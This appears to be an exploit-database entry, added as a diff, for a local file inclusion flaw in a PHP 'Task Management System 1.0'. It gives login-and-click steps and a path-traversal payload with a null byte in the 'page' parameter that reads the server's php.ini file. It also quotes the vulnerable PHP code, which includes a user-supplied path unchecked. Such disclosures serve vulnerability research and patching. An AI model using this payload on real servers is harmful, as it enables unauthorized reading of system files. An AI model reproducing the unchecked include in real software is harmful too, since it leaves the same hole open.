@@ -1,0 +1,26 @@
+# Exploit Title: Task Management System 1.0 - 'page' Local File Inclusion
+# Exploit Author: İsmail BOZKURT
+# Date: 2020-12-15
+# Vendor Homepage: https://www.sourcecodester.com/php/14615/task-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14615&title=Task+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Affected Version: Version 1
+# Category: Web Application
+# Tested on: Windows 10 x86_64
+
+Step 1. Log into application with credentials
+Step 2. Click on Branch
+Step 3. Select New Branch http://127.0.0.1/index.php?page=index
+Step 4. change index to ../../../c:/xampp/apache/bin/php.ini%00
+
+Note: php version < 5.3.3
+
+section class="content">
+    <div class="container-fluid">
+    <?php 
+    	$page = isset($_GET['page']) ? $_GET['page'] : 'home';
+	    if(!file_exists($page.".php")){
+	    include '404.html';
+	    }else{
+	    include $page.'.php';
+    }
+    ?>
